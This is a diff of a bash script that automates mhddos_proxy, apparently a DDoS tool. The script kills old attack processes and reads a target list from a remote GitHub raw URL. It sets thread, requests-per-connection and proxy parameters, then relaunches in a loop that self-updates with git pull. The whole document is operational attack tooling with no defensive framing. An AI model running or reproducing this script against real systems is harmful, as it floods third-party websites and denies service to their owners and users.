@@ -1,51 +1,19 @@
 #!/bin/bash
 
-echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Setting up"
+
+restart_interval="10m"
+
+ulimit -n 1048576
+# TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
+#cd ~/mhddos_proxy
+#sudo git checkout 49a4c8b034c2f7a5d3d0548e892414a2ebd30076
+#sudo pip3 install -r requirements.txt
 
 #Just in case kill previous copy of mhddos_proxy
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
 sudo pkill -e -f runner.py
 sudo pkill -e -f ./start.py
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
-
-sudo apt update -y
-sudo apt upgrade -y
-# Install git, python3
-sudo apt install git gcc libc-dev libffi-dev libssl-dev python3-dev rustc -y
-sudo apt install git -y
-sudo apt upgrade git -y
-sudo apt install wget -y
-sudo apt upgrade wget -y
-sudo apt install python3 -y
-sudo apt upgrade python3 -y
-sudo apt install python3-pip -y
-sudo apt upgrade python3-pip -y
-sudo apt install screen -y
-sudo apt upgrade screen -y
-sudo apt install curl -y
-sudo apt upgrade curl -y
-sudo -H pip3 install --upgrade pip
-ulimit -n 1048576
-
-#Install latest version of mhddos_proxy and MHDDoS
-cd ~
-sudo rm -r mhddos_proxy
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-cd ~/mhddos_proxy
-sudo pip3 install -r requirements.txt
-
-echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Done. Sleep for 2 minutes"
-
-sleep 2m
-
-echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Starting up..."
-
-restart_interval="10m"
-
-# for Docker
-#echo "Kill all useless docker-containers with MHDDoS"
-#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-#echo "Docker useless containers killed"
 
 targets="https://raw.githubusercontent.com/girador/res/main/targets.txt"
 
@@ -64,7 +32,6 @@ if ((rpc < 1000));
 then
 	rpc=1000
 fi
-
 
 debug="--debug"
 timeout="--proxy-timeout 3"
@@ -91,7 +58,7 @@ do
 	fi
 	
 	
-	cd ~/auto_mhddos
+	cd ~/auto
    	num=$(sudo git pull origin main | grep -c "Already")
    	echo "$num"
    	
@@ -100,7 +67,7 @@ do
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos"
 	else
-		cd ~/auto_mhddos
+		cd ~/auto
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos"
 		bash runner.sh $num_of_copies $threads $rpc& # run new downloaded script 
